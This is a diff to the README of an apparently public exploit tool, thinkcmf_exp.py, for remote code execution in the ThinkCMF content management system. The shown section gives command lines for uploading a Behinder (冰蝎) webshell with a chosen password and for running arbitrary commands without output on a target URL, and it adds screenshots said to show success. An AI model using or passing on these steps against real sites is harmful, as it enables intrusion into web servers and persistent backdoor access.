@@ -26,7 +26,10 @@ python thinkcmf_exp.py -u http://yourURL/
 
 ### 上传冰蝎马
 python thinkcmf_exp.py -u http://yourURL/ -p yourPassword
+![image](https://github.com/bo1349/Thinkcmf_RCE/blob/master/%E4%B8%8A%E4%BC%A0%E5%86%B0%E8%9D%8E.png)
+![image](https://github.com/bo1349/Thinkcmf_RCE/blob/master/%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F.png)
 
 ### 无回显命令执行
-
 python thinkcmf_exp.py -u http://yourURL/ -c yourCommand
+![image](https://github.com/bo1349/Thinkcmf_RCE/blob/master/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.png)
+![image](https://github.com/bo1349/Thinkcmf_RCE/blob/master/%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F.png)
